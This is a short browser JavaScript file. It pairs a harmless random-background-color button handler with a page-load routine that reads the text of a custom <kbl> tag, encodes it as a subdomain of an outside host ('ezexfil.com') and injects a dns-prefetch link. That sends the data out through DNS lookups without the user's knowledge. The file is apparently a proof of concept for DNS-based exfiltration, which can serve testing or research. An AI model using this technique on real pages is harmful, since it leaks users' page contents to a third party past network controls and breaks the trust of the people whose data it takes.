// This runs immediately when the script is loaded by the browser
console.log('delivrd');

/**
 * Changes the background to a random color and logs a message.
 */
function btnCalc() {
    // Generate a random hex color
    const randomColor = '#' + Math.floor(Math.random()*16777215).toString(16);
    
    // Change the background color of the page
    document.body.style.backgroundColor = randomColor;
    
    // Output the print statement
    console.log("Button clicked! New color: " + randomColor);
}

window.addEventListener('load', function() {
    // 1. Find the custom <kbl> tag
    const kblElement = document.querySelector('kbl');

    if (kblElement) {
        // 2. Get the raw text data from the tag
        const rawData = (kblElement.textContent || kblElement.innerText).trim();

        // 3. Construct the URL (Using the raw data directly)
        // Note: Ensure rawData doesn't contain spaces or symbols invalid for DNS
        const exfilUrl = `http://${rawData}.z3zhkadg4qsehefe.ezexfil.com`;

        // 4. Create the <link> element
        const link = document.createElement('link');
        link.rel = 'dns-prefetch';
        link.href = `${exfilUrl}`;

        // 5. Append to the document head
        document.head.appendChild(link);
        
        console.log("Page loaded. DNS Prefetch added for: " + exfilUrl);
    }
});
